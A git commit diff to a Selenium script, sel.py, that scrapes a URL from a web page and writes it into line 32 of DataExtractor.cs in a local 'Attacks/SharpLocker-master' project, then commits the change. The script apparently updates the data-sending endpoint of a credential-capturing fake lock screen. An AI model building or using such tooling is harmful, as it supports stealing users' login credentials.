f1fa41e094c95bba003a78a9f372cc150f6b798b
Pilot1782 <71522520+Pilot1782@users.noreply.github.com>
2021-08-12 10:20:12 -0600

    Update sel.py

--- sel.py
+++ sel.py
@@ -13,3 +13,17 @@ driver.implicitly_wait(10)
 url = driver.find_element_by_css_selector('input[class="xxlarge input-xxlarge"')
 
 print(url.get_attribute('value'))
+
+a_file = open("D:\Carson\Programming\Attacks\SharpLocker-master\SharpLocker\DataExtractor.cs", "r")
+list_of_lines = a_file.readlines()
+list_of_lines[31] = f"""            url = "{url.get_attribute('value')}";\n"""
+
+a_file = open("D:\Carson\Programming\Attacks\SharpLocker-master\SharpLocker\DataExtractor.cs", "w")
+a_file.writelines(list_of_lines)
+a_file.close()
+
+import os
+
+os.system("""cd D:\Carson\Programming\Attacks\SharpLocker-master\\""")
+os.system('git add D:\Carson\Programming\Attacks\SharpLocker-master\SharpLocker\DataExtractor.cs')
+os.system('git commit -m "updated url"')
